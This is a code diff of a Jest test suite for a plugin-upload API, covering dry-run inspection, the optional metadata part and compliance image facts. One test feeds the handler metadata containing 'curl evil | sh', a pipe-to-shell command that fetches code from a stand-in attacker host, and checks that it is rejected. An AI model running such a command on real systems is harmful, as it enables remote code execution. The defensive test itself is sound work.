@@ -3,7 +3,7 @@
 
 /**
  * POST /plugins/inspect and the upload's catalog handling (plugin-ecosystem
- * §3.1a, D19; W0.5 quota snapshot; W0.6 compliance deferral), driven through the
+ * quota snapshot; compliance deferral), driven through the
  * real handlers with the real catalog detection, shared validator and job
  * builder. Only I/O (zip parse, storage, queue, DB, compliance) is mocked.
  */
@@ -59,13 +59,16 @@ jest.unstable_mockModule('../src/helpers/build-strategy.js', () => ({
   getBuildStrategy: () => ({ producesImage: mockProducesImage.value }),
 }));
 jest.unstable_mockModule('../src/queue/connections.js', () => ({ enqueueBuild: mockEnqueueBuild, getOrgTier: jest.fn(async () => 'developer') }));
-jest.unstable_mockModule('../src/services/audit.js', () => ({ emitPluginAudit: jest.fn() }));
 jest.unstable_mockModule('../src/services/plugin-artifact-storage.js', () => ({
   putPluginArtifact: jest.fn(async () => undefined), deletePluginArtifact: jest.fn(), pluginArtifactKey: () => 'org-1/req-1.zip',
 }));
 jest.unstable_mockModule('../src/services/plugin-service.js', () => ({
   pluginService: { assertDeployable: mockAssertDeployable, deployVersion: mockDeployVersion },
 }));
+
+// The ecosystem graph (publish-request submission) is not under test here.
+jest.unstable_mockModule('../src/services/ecosystem/context.js', () => ({ callerFromRequest: jest.fn() }));
+jest.unstable_mockModule('../src/services/ecosystem/requests.js', () => ({ submitAfterBuild: jest.fn() }));
 
 const { createUploadPluginRoutes } = await import('../src/routes/upload-plugin.js');
 
@@ -157,7 +160,7 @@ describe('POST /plugins/inspect — dry run', () => {
 });
 
 describe('POST /plugins — the optional `metadata` part', () => {
-  it('refuses an execution-contract key with 400 before any quota is reserved (G56)', async () => {
+  it('refuses an execution-contract key with 400 before any quota is reserved', async () => {
     const { req, tempPath } = fileReq({ metadata: JSON.stringify({ commands: ['curl evil | sh'] }) });
     const res = mockRes();
 
@@ -224,7 +227,7 @@ describe('POST /plugins — the optional `metadata` part', () => {
   });
 });
 
-describe('POST /plugins — compliance image facts (W0.6)', () => {
+describe('POST /plugins — compliance image facts', () => {
   it('a plugin without its own image is checked with its honest image facts, nothing deferred', async () => {
     mockParsePluginZip.mockResolvedValue(parsed(newExtractDir()));
     await upload(fileReq().req, mockRes());
